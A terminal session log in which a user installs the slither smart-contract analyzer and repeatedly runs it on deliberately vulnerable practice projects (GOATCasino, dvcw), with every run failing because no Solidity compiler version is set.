sneha@sneha:~$ ls
Damn-Vulnerable-Wallet-App  Documents  dvcw        Music     Public  Templates
Desktop                     Downloads  GOATCasino  Pictures  snap    Videos
sneha@sneha:~$ cd Damn-Vulnerable-Wallet-App/
sneha@sneha:~/Damn-Vulnerable-Wallet-App$ ls
bootstrap.sh  dvwa-1.0.8  dvwa.sql  README.md  Vagrantfile  z_custom.ini
sneha@sneha:~/Damn-Vulnerable-Wallet-App$ cd..
cd..: command not found
sneha@sneha:~/Damn-Vulnerable-Wallet-App$  cd ..
sneha@sneha:~$ cd GOATCasino/
sneha@sneha:~/GOATCasino$ ls
contracts  ganache_output.txt  LICENCE.txt  README.md           truffle.js
exec       GOATlib             migrations   start_challenge.sh
sneha@sneha:~/GOATCasino$ cd contrast
bash: cd: contrast: No such file or directory
sneha@sneha:~/GOATCasino$ cd contracts/
sneha@sneha:~/GOATCasino/contracts$ ls
CasinoExchange.sol  Faucet.sol   Migrations.sol  Vault.sol
CasinoToken.sol     Lottery.sol  StrawDraw.sol   zeppelin
sneha@sneha:~/GOATCasino/contracts$ pip3 install slither-analyzer
Command 'pip3' not found, but can be installed with:
sudo apt install python3-pip
sneha@sneha:~/GOATCasino/contracts$ sudo apt install python3-pip
[sudo] password for sneha: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libexpat1 libexpat1-dev libjs-sphinxdoc libjs-underscore libpython3-dev
  libpython3.10 libpython3.10-dev libpython3.10-minimal libpython3.10-stdlib
  python3-dev python3-wheel python3.10 python3.10-dev python3.10-minimal
  zlib1g-dev
Suggested packages:
  python3.10-venv python3.10-doc binfmt-support
The following NEW packages will be installed:
  libexpat1-dev libjs-sphinxdoc libjs-underscore libpython3-dev
  libpython3.10-dev python3-dev python3-pip python3-wheel python3.10-dev
  zlib1g-dev
The following packages will be upgraded:
  libexpat1 libpython3.10 libpython3.10-minimal libpython3.10-stdlib
  python3.10 python3.10-minimal
6 upgraded, 10 newly installed, 0 to remove and 173 not upgraded.
Need to get 7,122 kB/14.3 MB of archives.
After this operation, 30.5 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://in.archive.ubuntu.com/ubuntu kinetic-updates/main amd64 libexpat1 amd64 2.4.8-2ubuntu0.22.10.1 [84.3 kB]
Get:2 http://in.archive.ubuntu.com/ubuntu kinetic-updates/main amd64 libexpat1-dev amd64 2.4.8-2ubuntu0.22.10.1 [137 kB]
Get:3 http://in.archive.ubuntu.com/ubuntu kinetic/main amd64 libjs-underscore all 1.13.3~dfsg+~1.11.4-1 [118 kB]
Get:4 http://in.archive.ubuntu.com/ubuntu kinetic/main amd64 libjs-sphinxdoc all 4.5.0-4 [142 kB]
Get:5 http://in.archive.ubuntu.com/ubuntu kinetic/main amd64 zlib1g-dev amd64 1:1.2.11.dfsg-4.1ubuntu1 [164 kB]
Get:6 http://in.archive.ubuntu.com/ubuntu kinetic-updates/main amd64 libpython3.10-dev amd64 3.10.7-1ubuntu0.3 [4,634 kB]
Get:7 http://in.archive.ubuntu.com/ubuntu kinetic/main amd64 libpython3-dev amd64 3.10.6-1 [7,096 B]
Get:8 http://in.archive.ubuntu.com/ubuntu kinetic-updates/main amd64 python3.10-dev amd64 3.10.7-1ubuntu0.3 [507 kB]
Get:9 http://in.archive.ubuntu.com/ubuntu kinetic/main amd64 python3-dev amd64 3.10.6-1 [26.0 kB]
Get:10 http://in.archive.ubuntu.com/ubuntu kinetic-updates/universe amd64 python3-wheel all 0.37.1-2ubuntu0.22.10.1 [31.7 kB]
Get:11 http://in.archive.ubuntu.com/ubuntu kinetic-updates/universe amd64 python3-pip all 22.2+dfsg-1ubuntu0.2 [1,271 kB]
Fetched 7,122 kB in 10s (679 kB/s)                                            
(Reading database ... 185526 files and directories currently installed.)
Preparing to unpack .../00-libexpat1_2.4.8-2ubuntu0.22.10.1_amd64.deb ...
Unpacking libexpat1:amd64 (2.4.8-2ubuntu0.22.10.1) over (2.4.8-2) ...
Preparing to unpack .../01-libpython3.10_3.10.7-1ubuntu0.3_amd64.deb ...
Unpacking libpython3.10:amd64 (3.10.7-1ubuntu0.3) over (3.10.7-1) ...
Preparing to unpack .../02-python3.10_3.10.7-1ubuntu0.3_amd64.deb ...
Unpacking python3.10 (3.10.7-1ubuntu0.3) over (3.10.7-1) ...
Preparing to unpack .../03-libpython3.10-stdlib_3.10.7-1ubuntu0.3_amd64.deb ...
Unpacking libpython3.10-stdlib:amd64 (3.10.7-1ubuntu0.3) over (3.10.7-1) ...
Preparing to unpack .../04-python3.10-minimal_3.10.7-1ubuntu0.3_amd64.deb ...
Unpacking python3.10-minimal (3.10.7-1ubuntu0.3) over (3.10.7-1) ...
Preparing to unpack .../05-libpython3.10-minimal_3.10.7-1ubuntu0.3_amd64.deb ..
.
Unpacking libpython3.10-minimal:amd64 (3.10.7-1ubuntu0.3) over (3.10.7-1) ...
Selecting previously unselected package libexpat1-dev:amd64.
Preparing to unpack .../06-libexpat1-dev_2.4.8-2ubuntu0.22.10.1_amd64.deb ...
Unpacking libexpat1-dev:amd64 (2.4.8-2ubuntu0.22.10.1) ...
Selecting previously unselected package libjs-underscore.
Preparing to unpack .../07-libjs-underscore_1.13.3~dfsg+~1.11.4-1_all.deb ...
Unpacking libjs-underscore (1.13.3~dfsg+~1.11.4-1) ...
Selecting previously unselected package libjs-sphinxdoc.
Preparing to unpack .../08-libjs-sphinxdoc_4.5.0-4_all.deb ...
Unpacking libjs-sphinxdoc (4.5.0-4) ...
Selecting previously unselected package zlib1g-dev:amd64.
Preparing to unpack .../09-zlib1g-dev_1%3a1.2.11.dfsg-4.1ubuntu1_amd64.deb ...
Unpacking zlib1g-dev:amd64 (1:1.2.11.dfsg-4.1ubuntu1) ...
Selecting previously unselected package libpython3.10-dev:amd64.
Preparing to unpack .../10-libpython3.10-dev_3.10.7-1ubuntu0.3_amd64.deb ...
Unpacking libpython3.10-dev:amd64 (3.10.7-1ubuntu0.3) ...
Selecting previously unselected package libpython3-dev:amd64.
Preparing to unpack .../11-libpython3-dev_3.10.6-1_amd64.deb ...
Unpacking libpython3-dev:amd64 (3.10.6-1) ...
Selecting previously unselected package python3.10-dev.
Preparing to unpack .../12-python3.10-dev_3.10.7-1ubuntu0.3_amd64.deb ...
Unpacking python3.10-dev (3.10.7-1ubuntu0.3) ...
Selecting previously unselected package python3-dev.
Preparing to unpack .../13-python3-dev_3.10.6-1_amd64.deb ...
Unpacking python3-dev (3.10.6-1) ...
Selecting previously unselected package python3-wheel.
Preparing to unpack .../14-python3-wheel_0.37.1-2ubuntu0.22.10.1_all.deb ...
Unpacking python3-wheel (0.37.1-2ubuntu0.22.10.1) ...
Selecting previously unselected package python3-pip.
Preparing to unpack .../15-python3-pip_22.2+dfsg-1ubuntu0.2_all.deb ...
Unpacking python3-pip (22.2+dfsg-1ubuntu0.2) ...
Setting up libexpat1:amd64 (2.4.8-2ubuntu0.22.10.1) ...
Setting up python3-wheel (0.37.1-2ubuntu0.22.10.1) ...
Setting up libexpat1-dev:amd64 (2.4.8-2ubuntu0.22.10.1) ...
Setting up libpython3.10-minimal:amd64 (3.10.7-1ubuntu0.3) ...
Setting up python3-pip (22.2+dfsg-1ubuntu0.2) ...
Setting up zlib1g-dev:amd64 (1:1.2.11.dfsg-4.1ubuntu1) ...
Setting up libjs-underscore (1.13.3~dfsg+~1.11.4-1) ...
Setting up python3.10-minimal (3.10.7-1ubuntu0.3) ...
Setting up libpython3.10-stdlib:amd64 (3.10.7-1ubuntu0.3) ...
Setting up libjs-sphinxdoc (4.5.0-4) ...
Setting up libpython3.10:amd64 (3.10.7-1ubuntu0.3) ...
Setting up python3.10 (3.10.7-1ubuntu0.3) ...
Setting up libpython3.10-dev:amd64 (3.10.7-1ubuntu0.3) ...
Setting up python3.10-dev (3.10.7-1ubuntu0.3) ...
Setting up libpython3-dev:amd64 (3.10.6-1) ...
Setting up python3-dev (3.10.6-1) ...
Processing triggers for desktop-file-utils (0.26-1ubuntu4) ...
Processing triggers for gnome-menus (3.36.0-1ubuntu3) ...
Processing triggers for libc-bin (2.36-0ubuntu4) ...
Processing triggers for man-db (2.10.2-2) ...
Processing triggers for mailcap (3.70+nmu1ubuntu1) ...
sneha@sneha:~/GOATCasino/contracts$ sudo pip3 install slither-analyzer
Collecting slither-analyzer
  Downloading slither_analyzer-0.9.3-py3-none-any.whl (655 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 655.6/655.6 kB 3.0 MB/s eta 0:00:00
Collecting pycryptodome>=3.4.6
  Downloading pycryptodome-3.17-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 2.3 MB/s eta 0:00:00
Collecting packaging
  Downloading packaging-23.0-py3-none-any.whl (42 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 42.7/42.7 kB 2.5 MB/s eta 0:00:00
Collecting crytic-compile<0.4.0,>=0.3.1
  Downloading crytic_compile-0.3.1-py3-none-any.whl (92 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 92.5/92.5 kB 1.8 MB/s eta 0:00:00
Collecting web3>=6.0.0
  Downloading web3-6.0.0-py3-none-any.whl (568 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 569.0/569.0 kB 2.7 MB/s eta 0:00:00
Collecting prettytable>=0.7.2
  Downloading prettytable-3.6.0-py3-none-any.whl (27 kB)
Collecting cbor2
  Downloading cbor2-5.4.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (224 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 224.6/224.6 kB 2.7 MB/s eta 0:00:00
Collecting solc-select>=v1.0.2
  Downloading solc_select-1.0.3-py3-none-any.whl (19 kB)
Collecting wcwidth
  Downloading wcwidth-0.2.6-py2.py3-none-any.whl (29 kB)
Collecting eth-account>=0.8.0
  Downloading eth_account-0.8.0-py3-none-any.whl (102 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 102.4/102.4 kB 4.1 MB/s eta 0:00:00
Collecting websockets>=10.0.0
  Downloading websockets-10.4-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (106 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 106.8/106.8 kB 2.3 MB/s eta 0:00:00
Requirement already satisfied: jsonschema>=4.0.0 in /usr/lib/python3/dist-packages (from web3>=6.0.0->slither-analyzer) (4.6.0)
Collecting eth-utils>=2.1.0
  Downloading eth_utils-2.1.0-py3-none-any.whl (24 kB)
Collecting parsimonious==0.9.0
  Downloading parsimonious-0.9.0.tar.gz (48 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 48.7/48.7 kB 5.2 MB/s eta 0:00:00
  Preparing metadata (setup.py) ... done
Collecting lru-dict>=1.1.6
  Downloading lru_dict-1.1.8-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (28 kB)
Collecting eth-abi>=4.0.0-b.2
  Downloading eth_abi-4.0.0-py3-none-any.whl (28 kB)
Collecting eth-hash[pycryptodome]>=0.5.1
  Downloading eth_hash-0.5.1-py3-none-any.whl (9.0 kB)
Collecting hexbytes>=0.1.0
  Downloading hexbytes-0.3.0-py3-none-any.whl (6.4 kB)
Collecting protobuf>=4.21.6
  Downloading protobuf-4.22.1-cp37-abi3-manylinux2014_x86_64.whl (302 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 302.4/302.4 kB 3.3 MB/s eta 0:00:00
Requirement already satisfied: requests>=2.16.0 in /usr/lib/python3/dist-packages (from web3>=6.0.0->slither-analyzer) (2.27.1)
Collecting eth-typing>=3.0.0
  Downloading eth_typing-3.3.0-py3-none-any.whl (6.3 kB)
Collecting aiohttp>=3.7.4.post0
  Downloading aiohttp-3.8.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.0 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.0/1.0 MB 2.6 MB/s eta 0:00:00
Collecting regex>=2022.3.15
  Downloading regex-2023.3.22-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (764 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 764.3/764.3 kB 3.8 MB/s eta 0:00:00
Collecting yarl<2.0,>=1.0
  Downloading yarl-1.8.2-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (264 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 264.0/264.0 kB 3.9 MB/s eta 0:00:00
Collecting multidict<7.0,>=4.5
  Downloading multidict-6.0.4-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (114 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 114.5/114.5 kB 3.4 MB/s eta 0:00:00
Collecting frozenlist>=1.1.1
  Downloading frozenlist-1.3.3-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (149 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 149.6/149.6 kB 2.9 MB/s eta 0:00:00
Collecting aiosignal>=1.1.2
  Downloading aiosignal-1.3.1-py3-none-any.whl (7.6 kB)
Requirement already satisfied: attrs>=17.3.0 in /usr/lib/python3/dist-packages (from aiohttp>=3.7.4.post0->web3>=6.0.0->slither-analyzer) (22.1.0)
Collecting async-timeout<5.0,>=4.0.0a3
  Downloading async_timeout-4.0.2-py3-none-any.whl (5.8 kB)
Collecting charset-normalizer<4.0,>=2.0
  Downloading charset_normalizer-3.1.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (199 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 199.3/199.3 kB 2.9 MB/s eta 0:00:00
Collecting eth-keys<0.5,>=0.4.0
  Downloading eth_keys-0.4.0-py3-none-any.whl (21 kB)
Collecting rlp<4,>=1.0.0
  Downloading rlp-3.0.0-py2.py3-none-any.whl (20 kB)
Collecting bitarray<3,>=2.4.0
  Downloading bitarray-2.7.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (272 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 272.7/272.7 kB 3.5 MB/s eta 0:00:00
Collecting eth-rlp<1,>=0.3.0
  Downloading eth_rlp-0.3.0-py3-none-any.whl (5.0 kB)
Collecting eth-keyfile<0.7.0,>=0.6.0
  Downloading eth_keyfile-0.6.1-py3-none-any.whl (6.5 kB)
Collecting cytoolz>=0.10.1
  Downloading cytoolz-0.12.1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (1.8 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 1.8/1.8 MB 2.6 MB/s eta 0:00:00
Requirement already satisfied: pyrsistent!=0.17.0,!=0.17.1,!=0.17.2,>=0.14.0 in /usr/lib/python3/dist-packages (from jsonschema>=4.0.0->web3>=6.0.0->slither-analyzer) (0.18.1)
Collecting toolz>=0.8.0
  Downloading toolz-0.12.0-py3-none-any.whl (55 kB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 55.8/55.8 kB 5.0 MB/s eta 0:00:00
Requirement already satisfied: idna>=2.0 in /usr/lib/python3/dist-packages (from yarl<2.0,>=1.0->aiohttp>=3.7.4.post0->web3>=6.0.0->slither-analyzer) (3.3)
Building wheels for collected packages: parsimonious
  Building wheel for parsimonious (setup.py) ... done
  Created wheel for parsimonious: filename=parsimonious-0.9.0-py3-none-any.whl size=44314 sha256=36779844dd31b3e65858fc8b4948723dd16a73bfaf642ff6f3f901667b9925c5
  Stored in directory: /root/.cache/pip/wheels/a8/6e/e1/5274cd97b5abf9c9fa5c7f51185d48bfc8095d8ce6ca251155
Successfully built parsimonious
Installing collected packages: wcwidth, lru-dict, bitarray, websockets, toolz, regex, pycryptodome, protobuf, prettytable, packaging, multidict, hexbytes, frozenlist, eth-typing, eth-hash, charset-normalizer, cbor2, async-timeout, yarl, solc-select, parsimonious, cytoolz, aiosignal, eth-utils, crytic-compile, aiohttp, rlp, eth-keys, eth-abi, eth-rlp, eth-keyfile, eth-account, web3, slither-analyzer
Successfully installed aiohttp-3.8.4 aiosignal-1.3.1 async-timeout-4.0.2 bitarray-2.7.3 cbor2-5.4.6 charset-normalizer-3.1.0 crytic-compile-0.3.1 cytoolz-0.12.1 eth-abi-4.0.0 eth-account-0.8.0 eth-hash-0.5.1 eth-keyfile-0.6.1 eth-keys-0.4.0 eth-rlp-0.3.0 eth-typing-3.3.0 eth-utils-2.1.0 frozenlist-1.3.3 hexbytes-0.3.0 lru-dict-1.1.8 multidict-6.0.4 packaging-23.0 parsimonious-0.9.0 prettytable-3.6.0 protobuf-4.22.1 pycryptodome-3.17 regex-2023.3.22 rlp-3.0.0 slither-analyzer-0.9.3 solc-select-1.0.3 toolz-0.12.0 wcwidth-0.2.6 web3-6.0.0 websockets-10.4 yarl-1.8.2
WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
sneha@sneha:~/GOATCasino/contracts$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.


sneha@sneha:~/GOATCasino/contracts$ cd 
sneha@sneha:~$ sudo git clone https://github.com/sneha0302/vulnerable_blockchain
Cloning into 'vulnerable_blockchain'...
Username for 'https://github.com': ^X
Password for 'https://@github.com': 
remote: Support for password authentication was removed on August 13, 2021.
remote: Please see https://docs.github.com/en/get-started/getting-started-with-git/about-remote-repositories#cloning-with-https-urls for information on currently recommended modes of authentication.
fatal: Authentication failed for 'https://github.com/sneha0302/vulnerable_blockchain/'
sneha@sneha:~$ git clone https://github.com/sneha0302/vulnerable_blockchain.git
Cloning into 'vulnerable_blockchain'...
Username for 'https://github.com': ^Z
[1]+  Stopped                 git clone https://github.com/sneha0302/vulnerable_blockchain.git
sneha@sneha:~$ ^C
sneha@sneha:~$ cd solidity/
sneha@sneha:~/solidity$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.

ERROR:root:Error in .
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
  File "/usr/local/bin/solc", line 8, in <module>
    sys.exit(solc())
  File "/usr/local/lib/python3.10/dist-packages/solc_select/__main__.py", line 80, in solc
    res = current_version()
  File "/usr/local/lib/python3.10/dist-packages/solc_select/solc_select.py", line 62, in current_version
    raise argparse.ArgumentTypeError(
argparse.ArgumentTypeError: No solc version set. Run `solc-select use VERSION` or set SOLC_VERSION environment variable.


sneha@sneha:~/solidity$ python version
Command 'python' not found, did you mean:
  command 'python3' from deb python3
  command 'python' from deb python-is-python3
sneha@sneha:~/solidity$ python --version
Command 'python' not found, did you mean:
  command 'python3' from deb python3
  command 'python' from deb python-is-python3
sneha@sneha:~/solidity$ python -version
Command 'python' not found, did you mean:
  command 'python3' from deb python3
  command 'python' from deb python-is-python3
sneha@sneha:~/solidity$ py --version
Command 'py' not found, but can be installed with:
sudo apt install pythonpy
sneha@sneha:~/solidity$ python3 -version
Unknown option: -e
usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
Try `python -h' for more information.
sneha@sneha:~/solidity$ python3 --version
Python 3.10.7
sneha@sneha:~/solidity$ cd ..
sneha@sneha:~$ ls
Damn-Vulnerable-Wallet-App  dvcw        Public     Videos
Desktop                     GOATCasino  snap       vulnerable_blockchain
Documents                   Music       solidity
Downloads                   Pictures    Templates
sneha@sneha:~$ cd vulnerable_blockchain/
sneha@sneha:~/vulnerable_blockchain$ ls
sneha@sneha:~/vulnerable_blockchain$ cd ..
sneha@sneha:~$ cd dvcw
sneha@sneha:~/dvcw$ ls
blockchain   docker-compose.yml  Makefile   web-api
desktop-app  LICENSE             README.md
sneha@sneha:~/dvcw$ cd blockchain
sneha@sneha:~/dvcw/blockchain$ ls
bchain               Dockerfile  setup.sh
contractAddress.txt  migrations  start-ganache.sh
contracts            README.md   truffle-config.js
sneha@sneha:~/dvcw/blockchain$ cd contracts/
sneha@sneha:~/dvcw/blockchain/contracts$ ls
DVCTokenSale.sol  DVCToken.sol  Migrations.sol
sneha@sneha:~/dvcw/blockchain/contracts$ slither ,
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 666, in compile_all
    raise ValueError(f"Unresolved target: {str(target)}")
ValueError: Unresolved target: ,
ERROR:root:Error in ,
ERROR:root:Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 666, in compile_all
    raise ValueError(f"Unresolved target: {str(target)}")
ValueError: Unresolved target: ,

sneha@sneha:~/dvcw/blockchain/contracts$ slither .
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 837, in main_impl
    ) = process_all(filename, args, detector_classes, printer_classes)
  File "/usr/local/lib/python3.10/dist-packages/slither/__main__.py", line 90, in process_all
    compilations = compile_all(target, **vars(args))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 664, in compile_all
    compilations.append(CryticCompile(filename, **kwargs))
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 131, in __init__
    self._compile(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/crytic_compile.py", line 553, in _compile
    self._platform.compile(self, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 156, in compile
    targets_json = _get_targets_json(compilation_unit, self._target, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 285, in _get_targets_json
    return _run_solc(
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 491, in _run_solc
    compiler="solc", version=get_version(solc, env), optimized=is_optimized(solc_arguments)
  File "/usr/local/lib/python3.10/dist-packages/crytic_compile/platform/solc.py", line 396, in get_version
    raise InvalidCompilation(
crytic_compile.platform.exceptions.InvalidCompilation: 
Solidity version not found:
STDOUT:

STDERR:
Traceback (most recent call last):
